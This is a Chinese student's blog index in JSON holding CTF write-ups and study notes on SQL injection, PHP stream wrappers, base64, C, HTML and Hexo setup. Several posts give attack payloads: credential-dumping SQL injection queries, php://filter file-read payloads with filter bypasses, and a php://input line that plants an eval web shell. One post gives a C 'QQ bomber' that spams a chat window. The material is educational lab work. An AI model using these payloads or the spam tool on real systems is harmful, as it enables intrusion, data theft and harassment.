{"meta":{"title":"xingyun","subtitle":"","description":"","author":"John Doe","url":"http://xingyun3326.github.io","root":"/"},"pages":[{"title":"archives","date":"2020-12-13T03:35:00.000Z","updated":"2020-12-13T03:35:40.000Z","comments":true,"path":"archives/index.html","permalink":"http://xingyun3326.github.io/archives/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-01-17T13:13:34.000Z","updated":"2021-01-17T13:15:16.845Z","comments":true,"path":"categories/index.html","permalink":"http://xingyun3326.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-12-12T09:18:37.000Z","updated":"2020-12-12T09:18:38.000Z","comments":true,"path":"tags/index.html","permalink":"http://xingyun3326.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"21-01-31","date":"2021-01-31T09:46:25.000Z","updated":"2021-01-31T09:49:05.814Z","comments":true,"path":"2021/01/31/21-01-31/","link":"","permalink":"http://xingyun3326.github.io/2021/01/31/21-01-31/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"","slug":"21-01-30","date":"2021-01-31T09:46:06.000Z","updated":"2021-01-31T09:54:15.973Z","comments":true,"path":"2021/01/31/21-01-30/","link":"","permalink":"http://xingyun3326.github.io/2021/01/31/21-01-30/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"sqlilabs  入门","slug":"21-01-29-1","date":"2021-01-29T13:34:07.000Z","updated":"2021-01-31T09:54:22.740Z","comments":true,"path":"2021/01/29/21-01-29-1/","link":"","permalink":"http://xingyun3326.github.io/2021/01/29/21-01-29-1/","excerpt":"sqlilabs","text":"sqlilabs 参考视频https://www.bilibili.com/video/BV1e441127Rd?from=search&amp;seid=18004264285550760559. 涉及知识点1234select schema_name from information_schema.schemata &#x2F;&#x2F;查库select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; &#x2F;&#x2F; 查表select column_name form information_schema.column.columns where table_name&#x3D;&#39;users&#39; &#x2F;&#x2F;查列select username,password from security.users &#x2F;&#x2F;查字段 12A and B ： A 和B 均成立才可执行A or B ： A 和 B 其中一个成立即可执行 1limint 0,1 : 表示 –+ 和–空格 是注释符 例如id=1’–+(id=1’– ) order by “数字”例如：order by 1 表示对第一列排序order by 2 表示对第二列排序order by 10 出现错误，表示这个数据不存在第十列； less-01数据存在3列； union select 1,2,3–+ mysql 命令行中：select * from users order by 1; 1234567select database(); select version(); select @@database; select system_user(); select current_user();select @@datadir;select @@version_compile_os 1group_concat() &#x2F;&#x2F;将所有数据拼接并显示 1concat_ws(&#39;~&#39;,username,password) &#x2F;&#x2F;显示结果为 username~password; 1group_concay(concat_ws(&#39;~&#39;,username,password)) 单引号会出现问题 可以将单引号及其内的字符转为16进制 less-011?id&#x3D;1","categories":[{"name":"SQL","slug":"SQL","permalink":"http://xingyun3326.github.io/categories/SQL/"}],"tags":[]},{"title":"QQ轰炸器","slug":"21-01-29","date":"2021-01-29T13:23:56.000Z","updated":"2021-01-31T09:54:20.825Z","comments":true,"path":"2021/01/29/21-01-29/","link":"","permalink":"http://xingyun3326.github.io/2021/01/29/21-01-29/","excerpt":"QQ轰炸器","text":"QQ轰炸器 123456789101112131415#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123; int i; char name[100]; printf(&quot;目标：&quot;); scanf(&quot;%s&quot;,&amp;name); printf(&quot;次数：&quot;); scanf(&quot;%d&quot;,&amp;i); HWND H &#x3D; FindWindow(0,name); &#x2F;&#x2F;寻找对话框 while(i--&gt;0)&#123; SendMessage(H,WM_PASTE,0,0); &#x2F;&#x2F;粘贴 SendMessage(H,WM_KEYDOWN,VK_RETURN,0);&#x2F;&#x2F;回车 &#125;&#125; 使用之前要先复制内容。","categories":[{"name":"有趣的编程","slug":"有趣的编程","permalink":"http://xingyun3326.github.io/categories/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"sqlilabs下载安装","slug":"21-01-28","date":"2021-01-28T11:08:18.000Z","updated":"2021-01-31T09:54:19.233Z","comments":true,"path":"2021/01/28/21-01-28/","link":"","permalink":"http://xingyun3326.github.io/2021/01/28/21-01-28/","excerpt":"PHPstudy安装sqli-labs及安装错误解决","text":"PHPstudy安装sqli-labs及安装错误解决 1.phpstudy安装点此安装安装之后如下设置 2.sqli-labs下载下载地址https://github.com/Audi-1/sqli-labs. 若phpstudy为最新版本，下载地址为https://github.com/Rinkish/Sqli_Edited_Version.](https://imgchr.com/i/y9gkgs)下载压缩包，然后解压到:\\phpstudy\\www\\目录下 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-xpyha13v-1611831866711)(https://s3.ax1x.com/2021/01/28/y92ps1.md.png)] 将\\phpStudy\\WWW\\sqli-labs\\sql-connections下的db-creds.inc红线处中做如此修改： [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-S5GO0BoJ-1611831643285)(https://s3.ax1x.com/2021/01/28/y9gC4g.md.png)]然后打开http://127.0.0.1/sqli-labs/或就可以了。 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-W48oVvlE-1611831681954)(https://s3.ax1x.com/2021/01/28/y9giCQ.md.png)] 然后点击 Setup/reset Database for labs 出现 点击 SQLi-LABS Page-1(Basic Challenges) 出现 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-cOBsIv3n-1611831725788)(https://s3.ax1x.com/2021/01/28/y9gAvn.md.png)] 就可以了。","categories":[{"name":"SQL","slug":"SQL","permalink":"http://xingyun3326.github.io/categories/SQL/"}],"tags":[]},{"title":"phpstudy详细安装","slug":"12-6-3","date":"2020-12-06T05:33:14.000Z","updated":"2021-01-31T09:53:57.052Z","comments":true,"path":"2020/12/06/12-6-3/","link":"","permalink":"http://xingyun3326.github.io/2020/12/06/12-6-3/","excerpt":"phpstudy详细安装","text":"phpstudy详细安装 首先下载phpstudy Windows版本下载地址. 下载之后打开压缩包， 解压得到 打开红色框框里面的东西，再打开的时候可能会遭到杀毒软件的拦截，可以把杀毒软件关掉。可以自定义安装地址，我这里装在了D盘中点击安装这样就安装成功了。","categories":[{"name":"phpstudy","slug":"phpstudy","permalink":"http://xingyun3326.github.io/categories/phpstudy/"}],"tags":[]},{"title":"攻防世界进阶Training-WWW-Robots","slug":"12-6-2","date":"2020-12-06T05:09:22.000Z","updated":"2021-01-31T09:53:51.843Z","comments":true,"path":"2020/12/06/12-6-2/","link":"","permalink":"http://xingyun3326.github.io/2020/12/06/12-6-2/","excerpt":"攻防世界进阶Training-WWW-Robots","text":"攻防世界进阶Training-WWW-Robots 根据提示用到robots协议打开robots.txt 得到如下 根据提示可知flag在/fl0g.php中，那么打开/fl0g.php得到","categories":[{"name":"攻防世界","slug":"攻防世界","permalink":"http://xingyun3326.github.io/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}],"tags":[]},{"title":"攻防世界进阶baby_web","slug":"12-6-1","date":"2020-12-06T03:35:53.000Z","updated":"2021-01-31T09:56:37.953Z","comments":true,"path":"2020/12/06/12-6-1/","link":"","permalink":"http://xingyun3326.github.io/2020/12/06/12-6-1/","excerpt":"攻防世界进阶baby_web","text":"攻防世界进阶baby_web 题目中的提示是，想象初始页面是哪个因此试试将url中1.php 改为index.php，然后会发现他又自动跳转成了1.php，那么F12改开选择网络，在这里再试试将url中1.php 改为index.php，然后在里面找到flag","categories":[{"name":"攻防世界","slug":"攻防世界","permalink":"http://xingyun3326.github.io/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}],"tags":[]},{"title":"SSRF1","slug":"12-6","date":"2020-12-06T03:18:43.000Z","updated":"2021-01-31T09:56:27.179Z","comments":true,"path":"2020/12/06/12-6/","link":"","permalink":"http://xingyun3326.github.io/2020/12/06/12-6/","excerpt":"SSRF1","text":"SSRF1 构造参数【GET】 1?url=dotnet.com../../../../../../../../flag 从而得到flag","categories":[{"name":"WP","slug":"WP","permalink":"http://xingyun3326.github.io/categories/WP/"}],"tags":[]},{"title":"PHP伪协议WP","slug":"12-5","date":"2020-12-05T09:40:32.000Z","updated":"2021-01-31T09:56:18.466Z","comments":true,"path":"2020/12/05/12-5/","link":"","permalink":"http://xingyun3326.github.io/2020/12/05/12-5/","excerpt":"PHP伪协议1","text":"PHP伪协议1 首先用下列代码 1?file=php://filter/read=convert.base64-encode/resource=flag 解题，得到下面情况。这是因为有PHP :preg_match()函数. 如果匹配到preg_match函数里的字符串，则返回ture,否则返回false。显然上述字符串里面含有php 和base两个字符，就返回了false从而输出了hacker！！！，那么如何绕过呢？参考正则表达式中各种字符的含义由于这里是区分大小写的，所以可以将php和base，更改成PHP,BAse(其中的一部分字母改为大写），即 1?file=PHP://filter/read=convert.bAse64-encode/resource=flag 就可以得到这是一个base64编码的内容（convert.base64-encode是转换过滤器，等同于base64_encode()，base64编码），将其解码，就可以得到flag。 PHP伪协议2首先用下列代码 1?file=php://filter/read=convert.base64-encode/resource=flag 解题，得到下面情况。这是因为preg_match()函数后面有个i，表示匹配的字符串不区分大小写，有根据提示得到一个str_replace()函数，这个函数是替换字符串用的。str_replace()函数替换字符串中的一些字符（区分大小写）。函数（）中的第一个“”中的内容将会被第二个“”中 的内容替换。从而可以有以下代码 1?file=ptroyehp://filter/read=convert.bastroyee64-encode/resource=flag 得到将base64解码就可以得到flag了。","categories":[{"name":"WP","slug":"WP","permalink":"http://xingyun3326.github.io/categories/WP/"}],"tags":[]},{"title":"bugku 字符？正则？","slug":"12-4","date":"2020-12-04T01:53:26.000Z","updated":"2021-01-31T09:55:47.780Z","comments":true,"path":"2020/12/04/12-4/","link":"","permalink":"http://xingyun3326.github.io/2020/12/04/12-4/","excerpt":"bugku 字符？正则？","text":"bugku 字符？正则？ 这是一道正则匹配题，preg_match()表达式 1preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); 中的 1&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot; 即要构造的参数需要符合的条件。参考正则表达式中各种字符的含义.可以构造一下字符 1keykeyaaaakey:/a/keya: 1keyakeyaaaakey:/a/aakeyb! 1keyakeyaaaakey:/a/keya! 等。 从而得到flag。","categories":[{"name":"bugku","slug":"bugku","permalink":"http://xingyun3326.github.io/categories/bugku/"}],"tags":[]},{"title":"PHP伪协议","slug":"12-3","date":"2020-12-03T06:59:23.000Z","updated":"2021-01-31T09:55:17.111Z","comments":true,"path":"2020/12/03/12-3/","link":"","permalink":"http://xingyun3326.github.io/2020/12/03/12-3/","excerpt":"伪协议","text":"伪协议 PHP伪协议有哪些PHP伪协议事实上就是支持的协议与封装协议（12种），基于函数include()和include_once()两个的利用情况： 1234567891011file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARexpect:// — 处理交互式的流 PHP伪协议能否使用php.ini配置文件中的allow_url_include和allow_url_fopen这两个设置，决定了PHP伪协议能否使用。allow_url_include默认为Off，而allow_url_fopen一直是On的，若打开allow_url_include，容易出现文件远程包含漏洞。1.php://filter读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。在双off的情况下也可以正常使用；2.仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include；php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。3.php:// — 访问各个输入/输出流，不需要开启allow_url_fopen4.file://协议是访问本地文件，也不受allow_url_include和allow_url_fopen的影响。 PHP伪协议的具体使用1.php://协议 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 (1)php://filter最常使用的一个伪协议，一般可以利用进行任意文件读取。php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 参数详解该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：[ ](https://imgchr.com/i/DqrJhR)例如：php://filter/read=convert.base64-encode/resource=index.php，index.php是目标文件。 可用的过滤器列表（4类）字符串过滤器 |作用——|——-string.rot13 | 等同于str_rot13()，rot13变换string.toupper |等同于strtoupper()，转大写字母string.tolower | 等同于strtolower()，转小写字母string.strip_tags |等同于strip_tags()，去除html、PHP语言标签 转换过滤器 作用 convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码 convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码 压缩过滤器 作用 zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。 加密过滤器 作用 mcrypt.* libmcrypt 对称加密算法 mdecrypt.* libmcrypt 对称解密算法 示例：（1）php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）（2）php://input + [POST DATA]执行php代码 123http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt; 若有权限 12[POST DATA部分]&lt;?php phpinfo(); ?&gt; 可改为一句话木马 12[POST DATA部分]&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt; 2.file://协议条件：allow_url_include：off/onallow_url_fopen: off/on 作用：用于访问本地文件系统，在CTF中通常用来读取本地文件。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 说明：file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径 示例：暂时没有","categories":[{"name":"PHP知识点","slug":"PHP知识点","permalink":"http://xingyun3326.github.io/categories/PHP%E7%9F%A5%E8%AF%86%E7%82%B9/"}],"tags":[]},{"title":"base64原理","slug":"12-2","date":"2020-12-02T12:47:13.000Z","updated":"2021-01-31T09:55:07.137Z","comments":true,"path":"2020/12/02/12-2/","link":"","permalink":"http://xingyun3326.github.io/2020/12/02/12-2/","excerpt":"base64编码原理","text":"base64编码原理 把原字符对照base64对照表转化为二进制（一个字符对应一个字节，即8位。）把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在每个6位的前面补两个0，形成8位，即一个字节。再将得到的二进制转化为十进制之后得到对应的字符。所以base64加密过后的内容比原来的大三分之一。举例：加密“ace”， 1.ace转化为二进制为：‭01100001‬ ‭01100011‬ ‭01100101‬，2.转化为base64的四字节六位：011000 01‬‭0110 0011‬01 100101‬，3.所以高位补00后变为：00011000 0001‬‭0110 000011‬01 00100101‬，4.转化为十进制：24 22 13 37，5.查Base64对照表（默认版本RFC2045）：","categories":[{"name":"各种编码","slug":"各种编码","permalink":"http://xingyun3326.github.io/categories/%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81/"}],"tags":[]},{"title":"C语言的函数","slug":"12-1","date":"2020-12-01T04:19:45.000Z","updated":"2021-01-31T09:54:58.499Z","comments":true,"path":"2020/12/01/12-1/","link":"","permalink":"http://xingyun3326.github.io/2020/12/01/12-1/","excerpt":"C语言","text":"C语言 一、自创函数C语言的库函数，有些时候并不能满足我们开发中的一些逻辑，所以就需要自定义函数，一般形式： 注意：1、[]包含的内容可以省略，数据类型说明省略，默认是int类型函数；参数省略表示该函数是无参函数，参数不省略表示该函数是有参函数；2、函数名称遵循标识符命名规范；3、自定义函数尽量放在main函数之前，如果要放在main函数后面的话，需要在main函数之前先声明自定义函数，声明格式为：[数据类型说明] 函数名称（[参数]）; 二、函数调用一般形式：注意：1、对无参函数调用的时候可以将[]包含的省略。2、[]中可以是常数，变量或其它构造类型数据及表达式，各参数之间用逗号分隔。例子： 三、有参与无参在函数中不需要函数参数的称之为无参函数，在函数中需要函数参数的称之为有参函数。一般形式：例子： 四、形参与实参函数的参数分为形参和实参两种,形参是在定义函数名和函数体的时候使用的参数,目的是用来接收调用该函数时传入的参数，就类似小明，说了的话而不实际行动；实参是在调用时传递该函数的参数，就如小刚能实际行动起来。特点：1.形参只有在被调用时才分配内存单元，在调用结束时，即刻释放所分配的内存单元。因此，形参只有在函数内部有效。函数调用结束返回主调函数后则不能再使用该形参变量。2.实参可以是常量、变量、表达式、函数等，无论实参是何种类型的量，在进行函数调用时，它们都必须具有确定的值，以便把这些值传送给形参。因此应预先用赋值等办法使实参获得确定值。3.在参数传递时，实参和形参在数量上，类型上，顺序上应严格一致，否则会发生类型不匹配”的错误。例子： 五、函数的返回值函数被调用之后，执行函数体中的程序段所取得的并返回给主调函数的值。注意： 函数的值只能通过return语句返回主调函数。 函数值的类型和函数定义中函数的类型应保持一致。如果两者不一致，则以函数返回类型为准，自动进行类型转换。 字符型数据整型数据没有返回值的函数，返回类型为void","categories":[{"name":"C语言","slug":"C语言","permalink":"http://xingyun3326.github.io/categories/C%E8%AF%AD%E8%A8%80/"}],"tags":[]},{"title":"HTML","slug":"11-30","date":"2020-11-30T11:42:40.000Z","updated":"2021-01-31T09:54:47.077Z","comments":true,"path":"2020/11/30/11-30/","link":"","permalink":"http://xingyun3326.github.io/2020/11/30/11-30/","excerpt":"HTML学习日志1","text":"HTML学习日志1 HTML的简单构成&lt;html&gt;、&lt;body&gt;、&lt;/h&gt;等都是标签，标签对大小写不敏感，但是在未来html中强制使用小写。 首先开始要有&lt;html&gt; 结尾要有&lt;/html&gt; 和之间的内容会显示在浏览器中。 标题：&lt;h1&gt;和&lt;/h1&gt;之间的是标题，可以有多个标题&lt;h2&gt;和&lt;/h2&gt;之间&lt;h3&gt;和&lt;/h3&gt;之间的也是标题。若要标题居中显示，则格式为： 1&lt;h1 align=&quot;center&quot;&gt;这是一个标题。`&lt;/h1&gt;` 段落：&lt;p&gt;和&lt;/p&gt;之间的内容为段落。若有多个段落，则有多个&lt;p&gt;&lt;/p&gt;。 标签 注意：1.一个&lt;p&gt;&lt;/p&gt;之间的内容为一个段落。即便在源代码中有很多行，但是在浏览器里面将会忽略这些行。2.段落的行数依赖浏览器窗口的大小。调节浏览器窗口的大小，行数将会发生改变。 链接格式：&lt;a herf=&quot;网址”&gt;链接的名字&lt;/a&gt;添加链接的例子： 1&lt;a herf=&quot;http://www.w3school.com.cn&quot;&gt;这是w3school的链接。&lt;/a&gt; 细小知识1.&lt;hr/&gt;可以创建水平线，用于分割内容。2.&lt;!--This is a comment--&gt;可以用来在代码中注释，并不会显示在网页中。3.如果希望在不产生一个新段落的情况下进行换行（新行），使用 &lt;br /&gt; 标签： 1&lt;p&gt;This is&lt;br /&gt;a para&lt;br /&gt;graph with line breaks&lt;/p&gt; 单个&lt;br/&gt;就表示折行，没有结束标签。4.&lt;q&gt;用于短的引号。eg：&lt;p&gt;他说&lt;q&gt;我爱你&lt;/q&gt;&lt;/p&gt;5.背景颜色 12345678&lt;html&gt;&lt;body style=&quot;background-color:yellow&quot;&gt;&lt;h2 style=&quot;background-color:red&quot;&gt;This is a heading&lt;/h2&gt;&lt;p style=&quot;background-color:green&quot;&gt;This is a paragraph.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 6.字体、颜色、尺寸 12345678&lt;html&gt;&lt;body&gt;&lt;h1 style=&quot;font-family:verdana&quot;&gt;A heading&lt;/h1&gt;&lt;p style=&quot;font-family:arial;color:red;font-size:20px;&quot;&gt;A paragraph.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 7.文本对齐 12345678&lt;html&gt;&lt;body&gt;&lt;h1 style=&quot;text-align:center&quot;&gt;This is a heading&lt;/h1&gt;&lt;p&gt;The heading above is aligned to the center of this page.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 8. 例子：123456789101112131415&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;h1 align=&quot;center&quot;&gt;我的第一个标题&lt;/h1&gt;&lt;!--这是一个注释--&gt;&lt;body style=&quot;background-color:lightblue&quot;&gt;&lt;p&gt;body中的内容会&lt;br/&gt;显示在页面中。&lt;/p&gt;&lt;hr/&gt;&lt;p&gt;title中的内容&lt;b&gt;会显示在&lt;q&gt;浏览器&lt;/q&gt;&lt;/b&gt;的标题中。&lt;/p&gt;&lt;a href=&quot;https://www.w3school.com.cn/example/html_examples.asp&quot;&gt;这是w3school的在线教程&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 显示结果","categories":[{"name":"HTML","slug":"HTML","permalink":"http://xingyun3326.github.io/categories/HTML/"}],"tags":[]},{"title":"第一篇文章——hexo搭建","slug":"11-29","date":"2020-11-29T11:42:40.000Z","updated":"2021-01-31T09:53:20.565Z","comments":true,"path":"2020/11/29/11-29/","link":"","permalink":"http://xingyun3326.github.io/2020/11/29/11-29/","excerpt":"这是我的第一篇博客","text":"这是我的第一篇博客 如何搭建博客1.安装Gitwindows：到git官网上下载,git for windows.下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。 linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码 1sudo apt-get install git 其实直接在软件管家里面也可以下载，而且更加方便。 2.安装Node.js下载地址可以根据不通电脑选择不同的版本来下载。Windows选择LTS就可。Linux： 12sudo apt-get install nodejssudo apt-get install npm 安装之后 12node -vnpm -v 可以查看是否安装成功。 3.安装Hexo创建一个空的文件夹，例如blog，在里面右键点击打开git bash here然后输入命令 1npm install -g hexo-cli 安装之后,初始化hexo 1hexo init myblog 这个命令中myblog是自己取的名字 12cd myblog //进入这个myblog文件夹npm install 12hexo ghexo server 或者在这个myblog文件夹里面打开git bashhexo server或者hexo s命令，即启动本地hexo，然后在浏览器打开localhost:4000，即可看到自己的博客，此时的博客还只能由自己在本地启动hexo s 自己查看，别人是看不到你的博客的。 4.GitHub创建个人仓库注册GitHub的账户GitHub.注册之后选择New repository，即创建新仓库。仓库的名字为GitHub的用户名加上.github.io点击create repository。 5.生成SSH添加到GitHub在自己创建的myblog中打开git bash，输入 12git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot; 这个命令用来检验是否成功 12git config user.namegit config user.email 然后创建SSH，输入下列命令，连续回车。 1ssh-keygen -t rsa -C &quot;youremail&quot; 在电脑中找到.ssh的文件夹，打开之后用记事本打开id_rsa.pub复制所有里面内容，粘贴到GitHub的 setting的 SSH keys 的New SSH key里面，代码 1ssh -T git@github.com 可以检查是否成功。 6.将hexo部署到GitHub、哇，终于最后一步了在myblog文件夹里面，记事本打开_config.yml（站点配置文件），在最后修改为 1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master 输入命令，安装deploy-git 1npm install hexo-deployer-git --save 再 123hexo cleanhexo generatehexo deploy 最后输入代码之后应该会出现一个窗口，让你输入GitHub用户名（或注册使用的邮箱）和密码。注意别错过了哟！别输错哟！http://yourname.github.io打开这个网址就可以让别人也能查看你的博客了哦！yourname即用户名。7.个性化设置这就需要选择主题了,主题选择你喜欢的主题然后下载code，解压到themes文件里面然后在_config.yml中找到theme将后面的主题名字改为你所下载的主题的名字，即所下载的主题那个文件夹的名字。之后在Git Bash中输入hexo clean &amp;&amp; hexo g -d即可。然后就更改完毕。 如何上传博客红色方框里的内容为在git bash输入的内容，红色下划线的内容为所创建的文章的路径。 2.编辑文章。这就需要用到md文件的编辑方法了，分享一个md文件的编辑方法的网站 ，点这个.","categories":[{"name":"hexo","slug":"hexo","permalink":"http://xingyun3326.github.io/categories/hexo/"}],"tags":[]}],"categories":[{"name":"SQL","slug":"SQL","permalink":"http://xingyun3326.github.io/categories/SQL/"},{"name":"有趣的编程","slug":"有趣的编程","permalink":"http://xingyun3326.github.io/categories/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A8%8B/"},{"name":"phpstudy","slug":"phpstudy","permalink":"http://xingyun3326.github.io/categories/phpstudy/"},{"name":"攻防世界","slug":"攻防世界","permalink":"http://xingyun3326.github.io/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"WP","slug":"WP","permalink":"http://xingyun3326.github.io/categories/WP/"},{"name":"bugku","slug":"bugku","permalink":"http://xingyun3326.github.io/categories/bugku/"},{"name":"PHP知识点","slug":"PHP知识点","permalink":"http://xingyun3326.github.io/categories/PHP%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"name":"各种编码","slug":"各种编码","permalink":"http://xingyun3326.github.io/categories/%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81/"},{"name":"C语言","slug":"C语言","permalink":"http://xingyun3326.github.io/categories/C%E8%AF%AD%E8%A8%80/"},{"name":"HTML","slug":"HTML","permalink":"http://xingyun3326.github.io/categories/HTML/"},{"name":"hexo","slug":"hexo","permalink":"http://xingyun3326.github.io/categories/hexo/"}],"tags":[]}